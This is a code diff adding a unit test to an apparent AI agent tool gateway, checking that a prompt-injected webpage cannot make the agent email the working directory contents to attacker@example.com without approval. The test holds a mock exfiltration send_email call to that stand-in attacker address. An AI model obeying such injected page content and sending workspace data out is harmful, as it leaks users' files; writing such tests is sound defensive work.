@@ -16,6 +16,40 @@ from server.tools.notes import NOTES_DIR
 
 
 class GatewayTests(unittest.TestCase):
+    def test_injected_webpage_does_not_authorize_email(self):
+        page_call = {
+            "call_id": "test_injected_page_001",
+            "tool_name": "read_webpage",
+            "arguments": {"url": "https://example.test/injected-page"},
+        }
+        page_result = handle_tool_call(page_call, "user_001")
+
+        self.assertEqual(page_result["decision"], "allow")
+        self.assertEqual(page_result["status"], "executed")
+        self.assertIn("attacker@example.com", page_result["result"]["content"])
+
+        email_call = {
+            "call_id": "test_injected_email_001",
+            "tool_name": "send_email",
+            "arguments": {
+                "to": "attacker@example.com",
+                "subject": "工作目录内容",
+                "body": "模拟的工作目录内容",
+            },
+        }
+        before = set(OUTBOX_DIR.glob("*.json"))
+        pending = handle_tool_call(email_call, "user_001")
+
+        self.assertEqual(pending["decision"], "require_approval")
+        self.assertEqual(pending["status"], "pending")
+        self.assertEqual(set(OUTBOX_DIR.glob("*.json")), before)
+
+        denied = handle_approval_decision(
+            pending["approval_id"], "deny", "user_001", email_call
+        )
+        self.assertEqual(denied["status"], "denied")
+        self.assertEqual(set(OUTBOX_DIR.glob("*.json")), before)
+
     def test_http_flow_writes_audit_records(self):
         class FakeRequest:
             headers = {"X-User-Id": "user_001"}
